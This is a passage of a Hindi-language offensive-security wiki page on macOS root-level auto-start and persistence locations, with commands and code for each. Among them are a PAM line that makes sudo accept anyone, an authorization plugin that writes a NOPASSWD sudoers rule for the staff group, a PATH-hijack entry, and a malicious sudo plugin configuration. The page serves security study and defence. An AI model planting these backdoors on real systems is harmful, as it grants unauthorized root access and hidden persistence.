import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

दोनों markers दिखाई दिए। `-s`, `-I` या `-S` के साथ दोहराने पर इस परीक्षण में **user-site** के दोनों markers नहीं आए। Global site directory में `sitecustomize` का परीक्षण नहीं किया गया।

## Root Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिलेंगे, जिनकी मदद से आप केवल **किसी फ़ाइल में कुछ लिखकर** उसे execute कर सकते हैं, लेकिन इसके लिए **root** होना और/या अन्य **अजीब शर्तों** का पूरा होना ज़रूरी हो सकता है।

### Periodic

> [!CAUTION]
> **ऐतिहासिक mechanism:** macOS 26.5.2 परीक्षण मशीन पर `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` और `com.apple.periodic-*` launch daemons मौजूद नहीं हैं। यह न मानें कि मौजूदा सिस्टम पर `/etc/periodic` बनाने से उसकी सामग्री schedule हो जाएगी। नीचे दिया गया उदाहरण इस्तेमाल करने से पहले target release पर command और enabled scheduler, दोनों की मौजूदगी जाँचें।

लेख: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपके पास root होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root आवश्यक
  - **ट्रिगर**: समय आने पर
- `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local`
  - Root आवश्यक
  - **ट्रिगर**: समय आने पर

#### विवरण और शोषण

पुराने releases में, periodic scripts (**`/etc/periodic`**) को **launch daemons**, `/System/Library/LaunchDaemons/com.apple.periodic*`, schedule करते थे। macOS Big Sur 11.5 से periodic runner, periodic directories की scripts को **हर फ़ाइल के owner** के रूप में चलाता था, जिससे privilege-escalation का एक पुराना रास्ता बंद हो गया।<sup>[[27]](#references)</sup> नीचे दिए गए commands और directory listings ऐतिहासिक output हैं, macOS 26.5.2 पर परीक्षण के नतीजे नहीं।

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

अन्य periodic scripts भी हैं, जिन्हें चलाया जाएगा और जिनका उल्लेख **`/etc/defaults/periodic.conf`** में किया गया है:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

पुराने systems पर, जहाँ `periodic` और उसके launch daemons इंस्टॉल और enabled होते थे, `/etc/daily.local`, `/etc/weekly.local`, और `/etc/monthly.local` अतिरिक्त execution paths थे। एक harmless read-only जाँच यह है:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> मालिकाना-आधारित नियम सीधे periodic directories में मौजूद scripts पर लागू होता था। ऐतिहासिक `999.local` wrapper `/etc/daily.local`, `/etc/weekly.local`, या `/etc/monthly.local` को उसी ownership check के बिना source करता था; जब scheduler root के रूप में चलता था, तो ये local files भी root के रूप में चलती थीं। इस अंतर और Big Sur 11.5 में हुए बदलाव का दस्तावेज़ीकरण [original research](https://theevilbit.github.io/beyond/beyond_0019/) में है। `periodic` मौजूद न होने पर इनमें से किसी भी path को सक्रिय नहीं मानना चाहिए।

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपके पास root होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### लोकेशन

- हमेशा root आवश्यक है

#### विवरण और Exploitation

चूँकि PAM, macOS के अंदर आसानी से execution करने के बजाय **persistence** और malware पर अधिक केंद्रित है, इसलिए यह blog विस्तृत व्याख्या नहीं देगा। **इस technique को बेहतर ढंग से समझने के लिए writeups पढ़ें**।<sup>[[28]](#references)</sup>

PAM modules देखने के लिए:

```bash
ls -l /etc/pam.d
```

PAM का दुरुपयोग करने वाली persistence/privilege escalation technique के लिए बस module /etc/pam.d/sudo में बदलाव करके शुरुआत में यह line जोड़नी होती है:

```bash
auth       sufficient     pam_permit.so
```

तो यह कुछ ऐसा **दिखेगा**:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

और इसलिए, `sudo` का उपयोग करने का कोई भी प्रयास सफल होगा।

> [!CAUTION]
> ध्यान दें कि यह directory TCC द्वारा सुरक्षित है, इसलिए बहुत संभव है कि user को access की अनुमति माँगने वाला prompt दिखाई दे।

एक और अच्छा उदाहरण `su` है, जहाँ आप देख सकते हैं कि PAM modules को parameters देना भी संभव है (और आप इस file में backdoor भी डाल सकते हैं):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Sandbox को bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन इसके लिए root access और अतिरिक्त configs चाहिए
- TCC bypass: ???

#### स्थान

- `/Library/Security/SecurityAgentPlugins/`
  - Root access आवश्यक है
  - Authorization database को plugin इस्तेमाल करने के लिए configure करना भी ज़रूरी है

#### विवरण और Exploitation

आप एक authorization plugin बना सकते हैं, जो persistence बनाए रखने के लिए user के लॉग-इन करने पर execute होगा। इनमें से कोई plugin बनाने के तरीके के बारे में अधिक जानकारी के लिए पिछले writeups देखें (और सावधान रहें—गलत तरीके से लिखा गया plugin आपको system से lock out कर सकता है, जिसके बाद आपको recovery mode से अपने Mac को साफ़ करना होगा)।<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**ले जाएँ** bundle को लोड किए जाने वाले स्थान पर:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

अंत में इस Plugin को load करने के लिए **rule** जोड़ें:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** authorization framework को बताएगा कि authorization के लिए उसे **किसी बाहरी mechanism को कॉल करना होगा**। इसके अलावा, **`privileged`** इसे root के रूप में execute करवाएगा।

इसे इससे ट्रिगर करें:

```bash
security authorize com.asdf.asdf
```

और फिर **staff group** के पास sudo access होना चाहिए (पुष्टि करने के लिए `/etc/sudoers` पढ़ें)।

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपके पास root access होना चाहिए और user को man का उपयोग करना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`/private/etc/man.conf`**
  - Root आवश्यक है
  - **`/private/etc/man.conf`**: जब भी man का उपयोग किया जाए

#### विवरण और Exploit

Config file **`/private/etc/man.conf`** उस binary/script को बताती है जिसका उपयोग man documentation files खोलने के लिए किया जाता है। इसलिए executable का path बदला जा सकता है, ताकि user जब भी कुछ docs पढ़ने के लिए man का उपयोग करे, तो एक backdoor execute हो जाए।<sup>[[31]](#references)</sup>

उदाहरण के लिए, **`/private/etc/man.conf`** में यह सेट करें:

```
MANPAGER /tmp/view
```

और फिर `/tmp/view` को इस रूप में बनाएँ:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपके पास root access होना चाहिए और apache चल रहा होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd के पास entitlements नहीं हैं

#### स्थान

- **`/etc/apache2/httpd.conf`**
  - Root access आवश्यक
  - ट्रिगर: Apache2 शुरू होने पर

#### विवरण और Exploit

आप `/etc/apache2/httpd.conf` में इस तरह की पंक्ति जोड़कर किसी module को load करने का निर्देश दे सकते हैं:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

इस तरह आपका compiled module Apache द्वारा load किया जाएगा। बस, आपको या तो इसे **valid Apple certificate से sign** करना होगा, या system में **एक नया trusted certificate जोड़कर** उससे इसे **sign** करना होगा।

फिर, ज़रूरत पड़ने पर यह सुनिश्चित करने के लिए कि server शुरू हो, आप यह execute कर सकते हैं:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Dylb के लिए कोड उदाहरण:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपके पास root होना चाहिए, auditd चल रहा होना चाहिए और कोई warning उत्पन्न होनी चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
  - Root आवश्यक है
  - **Trigger**: जब auditd किसी warning का पता लगाता है

#### Description & Exploit

जब भी auditd किसी warning का पता लगाता है, तो script **`/etc/security/audit_warn`** **execute** होती है। इसलिए आप इसमें अपना payload जोड़ सकते हैं।<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

आप `sudo audit -n` से चेतावनी दिखाने के लिए बाध्य कर सकते हैं।

### Startup Items

> [!CAUTION] > **यह deprecated है, इसलिए उन directories में कुछ भी नहीं मिलना चाहिए।**

**StartupItem** एक directory है, जिसे `/Library/StartupItems/` या `/System/Library/StartupItems/` में रखा जाना चाहिए। यह directory बनने के बाद, इसमें दो विशिष्ट files होनी चाहिए:

1. एक **rc script**: Startup के समय चलने वाली shell script।
2. एक **plist file**, जिसका नाम `StartupParameters.plist` होना चाहिए और जिसमें विभिन्न configuration settings होती हैं।

Startup process द्वारा इन्हें पहचानने और उपयोग करने के लिए, सुनिश्चित करें कि rc script और `StartupParameters.plist` file—दोनों **StartupItem** directory के अंदर सही जगह पर हों।

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> मुझे अपने macOS में यह component नहीं मिला, इसलिए अधिक जानकारी के लिए writeup देखें।

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple द्वारा पेश किया गया **emond** एक logging mechanism है, जो अविकसित या संभवतः परित्यक्त लगता है, फिर भी उपलब्ध है। हालांकि Mac administrator के लिए यह विशेष रूप से उपयोगी नहीं है, लेकिन यह अस्पष्ट service threat actors के लिए persistence का एक सूक्ष्म तरीका हो सकती है, जिस पर अधिकांश macOS admins का ध्यान शायद न जाए।<sup>[[34]](#references)</sup>

जो लोग इसके अस्तित्व से परिचित हैं, उनके लिए **emond** के किसी भी malicious उपयोग की पहचान करना आसान है। इस service का system LaunchDaemon, निष्पादित करने के लिए scripts को एक ही directory में खोजता है। इसे जाँचने के लिए, निम्न command का उपयोग किया जा सकता है:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### स्थान

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root आवश्यक
  - **ट्रिगर**: XQuartz के साथ

#### विवरण और Exploit

XQuartz अब **macOS में इंस्टॉल नहीं होता**, इसलिए अधिक जानकारी के लिए writeup देखें।<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Kext इंस्टॉल करना इतना जटिल है—Root के रूप में भी—कि जब तक आपके पास कोई exploit न हो, इसे sandbox-escape या persistence की व्यावहारिक तकनीक नहीं माना जाता।

#### स्थान

KEXT को startup item के रूप में इंस्टॉल करने के लिए, इसे **निम्नलिखित में से किसी एक स्थान पर इंस्टॉल करना होगा**:

- `/System/Library/Extensions`
  - OS X operating system में शामिल KEXT फ़ाइलें।
- `/Library/Extensions`
  - थर्ड-पार्टी सॉफ़्टवेयर द्वारा इंस्टॉल की गई KEXT फ़ाइलें

आप वर्तमान में लोड की गई kext फ़ाइलों की सूची इस तरह देख सकते हैं:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

अधिक जानकारी के लिए [**kernel extensions के बारे में यह section देखें**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers)।

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### स्थान

- **`/usr/local/bin/amstoold`**
  - Root की आवश्यकता है

#### विवरण और Exploitation

ऐसा लगता है कि `/System/Library/LaunchAgents/com.apple.amstoold.plist` का `plist` इस binary का उपयोग कर रहा था और साथ ही एक XPC service उपलब्ध करा रहा था... बात यह है कि binary मौजूद नहीं थी, इसलिए आप वहाँ कुछ रख सकते थे और XPC service के call होने पर आपका binary call किया जाता।<sup>[[35]](#references)</sup>

अब मुझे यह अपने macOS में नहीं मिल रहा है।

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### स्थान

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root की आवश्यकता है
  - **Trigger**: जब service चलती है (शायद ही कभी)

#### विवरण और exploit

ऐसा लगता है कि इस script को चलाना बहुत आम नहीं है और मुझे यह अपने macOS में भी नहीं मिली, इसलिए अधिक जानकारी के लिए writeup देखें।<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **यह आधुनिक MacOS versions में काम नहीं करता**

यहाँ **startup पर चलने वाले commands रखना भी संभव है।** सामान्य rc.common script का उदाहरण:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd बूट टास्क

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (root की आवश्यकता है)
- root की आवश्यकता है, साथ ही path के आधार पर **SIP bypass** या **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access permission की भी

#### स्थान

`launchd` अपने **`__TEXT,__config`** section में एक plist एम्बेड करता है, जो शुरुआती "boot tasks" का वर्णन करती है। कई reference scripts/binaries डिफ़ॉल्ट रूप से मौजूद **नहीं** होते और इन्हें attacker बना सकता है:

- SIP-bypass सेट: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA सेट: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` केवल Sequoia+ पर पहले से मौजूद होता है)

#### विवरण और Exploitation

यह देखने के लिए embedded task table dump करें कि `launchd` कौन-सी files चलाएगा और कौन-सी keys समर्थित हैं (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

किसी संदर्भित फ़ाइल (जैसे `/etc/rc.server`) को बनाने से `launchd` अगले (userspace) reboot पर उसे execute करता है। सबसे उपयोगी entries पर SIP की पाबंदी है या उन्हें TCC SysAdminFiles/Full Disk Access की ज़रूरत होती है, इसलिए यह root-level, reboot-triggered technique है।<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

`rc.trampoline` boot task, boot के समय `apple-trusted-trampoline` NVRAM variable में stored **platform (Apple-signed) binary** को चलाता है, लेकिन **केवल तब जब `rc.trampoline=1` boot-arg set हो और SIP disabled हो** (इसके साथ ~390&nbsp;KB की size limit और blocking/return-fast constraint है)। चूँकि इसके लिए **root + SIP disabled + Apple-signed payload** की ज़रूरत होती है, इसलिए वास्तविक दुनिया में persistence के लिए यह लगभग अव्यावहारिक है और यहाँ केवल पूर्णता के लिए शामिल है।<sup>[[41]](#references)</sup>

### /etc/paths और /etc/paths.d (PATH hijack)

- sandbox को bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (लिखने के लिए root चाहिए)
- root आवश्यक है

#### स्थान

- **`/etc/paths`** और **`/etc/paths.d/*`** — login पर default `PATH` बनाने के लिए इन्हें **`path_helper`** पढ़ता है (`/etc/zprofile` से invoke किया जाता है)।

#### विवरण और शोषण

दोनों root-owned हैं। किसी attacker-controlled directory को सबसे आगे रखने (या तो `/etc/paths` को edit करके या `/etc/paths.d/` में कोई file डालकर) से वह directory हर नए login shell के `PATH` में शुरुआत में दिखाई देती है। इस तरह किसी आम command (`ls`, `git`, …) के नाम वाला malicious binary असली binary को **shadow** करता है और अगली बार victim के उसे invoke करने पर चलता है।

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

लेख: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- sandbox bypass करने में उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (root चाहिए)
- root आवश्यक; परिणामस्वरूप **SIP bypass** होता है। प्रभावित macOS संस्करण **15.0–15.1** हैं; **15.2** में ठीक किया गया।

#### स्थान

- **`/Library/Filesystems/`** में filesystem bundle डालें।

#### विवरण और Exploitation

`storagekitd` के पास **`com.apple.rootless.install.heritable`** entitlement है और यह filesystem bundles के binaries को इस SIP-bypassing क्षमता के साथ **विरासत में मिली** स्थिति में चलाता है। एक दुर्भावनापूर्ण filesystem bundle रखकर, हमलावर SIP bypass के साथ code चला सकता था, ताकि **persistent kernel extensions** install किए जा सकें या SIP-सुरक्षित `LaunchDaemon` directories में लिखा जा सके — ऐसी persistence जो सामान्य protections को पार करके बनी रहती है।<sup>[[46]](#references)</sup> Apple ने macOS Sequoia 15.2 में इसे ठीक किया।

### sudo plugins (/etc/sudo.conf)

लेख: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- sandbox bypass करने में उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (`/etc/sudo.conf` लिखने के लिए root चाहिए)
- install करने के लिए root आवश्यक; इसके बाद plugin **हर `sudo` invocation** के अंदर चलता है (setuid-root context)

#### स्थान

- **`/etc/sudo.conf`** — `Plugin` lines, **`/usr/libexec/sudo/`** (या किसी absolute path) से shared objects load करती हैं। यह डिफ़ॉल्ट रूप से मौजूद नहीं होती (sudo built-in policy का उपयोग करता है), इसलिए इसे बनाना एक साफ़ hook है।

#### विवरण और Exploitation

`sudo`, `/etc/sudo.conf` से अपने policy/approval/audit plugins load करता है। चूँकि `sudo` setuid-root है, इसलिए एक दुर्भावनापूर्ण shared-object plugin **हर बार जब कोई user `sudo` चलाता है, root privileges** के साथ execute होता है — यह टिकाऊ root persistence देता है और हर sudo command को भी देखता है।<sup>[[51]](#references)</sup> macOS में sudo 1.9.x आता है, जो plugin API को support करता है।

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

लेख: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
न्यूनतम उदाहरण: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Legacy mechanism:** macOS 12.3 से deprecated। macOS 14.1 और उसके बाद के संस्करण legacy video plug-ins को डिफ़ॉल्ट रूप से disable करते हैं। इस path के काम करने से पहले उपयोगकर्ता को Recovery से legacy video support restore करना होगा; केवल writable directory पर्याप्त नहीं है। [Apple की वर्तमान support guidance](https://support.apple.com/en-us/108387)।
- Plug-in directory में लिखने के लिए root आवश्यक है। कोई भी code execution ऐसे compatible client पर निर्भर करता है जो अब भी DAL plug-ins load करता हो; macOS 26 पर इसका runtime परीक्षण नहीं किया गया।

#### स्थान

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root आवश्यक है
  - **Trigger:** कोई compatible camera client **legacy support restore किए जाने के बाद** devices enumerate करता है। Client library validation third-party plug-in को block कर सकती है।

#### विवरण और Exploitation

CoreMediaIO **DAL** (Device Abstraction Layer) plug-ins कुछ camera applications द्वारा in-process load किए जाते थे। Apple की [camera-extension presentation](https://developer.apple.com/videos/play/wwdc2022/10022/) में स्पष्ट रूप से कहा गया है कि legacy DAL plug-ins FaceTime, QuickTime Player या Photo Booth के साथ **काम नहीं करते थे**, और कई अन्य clients library validation लागू करते हैं। आधुनिक [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) अलग installation और approval model के साथ out of process चलते हैं। ऐतिहासिक in-process technique से वर्तमान macOS पर सामान्य Camera TCC bypass का संकेत नहीं मिलता।<sup>[[53]](#references)[[54]](#references)</sup>

macOS 26 पर केवल-पढ़ने योग्य निरीक्षण: `/Library/CoreMediaIO/Plug-Ins/DAL` मौजूद है और root के स्वामित्व में है। न तो legacy support की पुष्टि की गई और न ही किसी client में loading की।

### Directory Service Plugins

लेख: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Legacy, conditional mechanism:** इसे install करने के लिए root और ऐसे plug-in की आवश्यकता होती है जो वास्तव में configured और loaded हो। DirectoryService का plug-in API deprecated है; इसे boot trigger मानने से पहले target Mac का Open Directory configuration देखें।

#### स्थान

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root आवश्यक है
  - **Trigger:** Open Directory को आवश्यकता पड़ने पर `dspluginhelperd` eligible configured plug-in load करता है। [Apple की plug-in runtime guide](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) के अनुसार, startup के लिए configured न किए गए plug-ins node खुलने पर lazily load हो सकते हैं।

#### विवरण और Exploitation

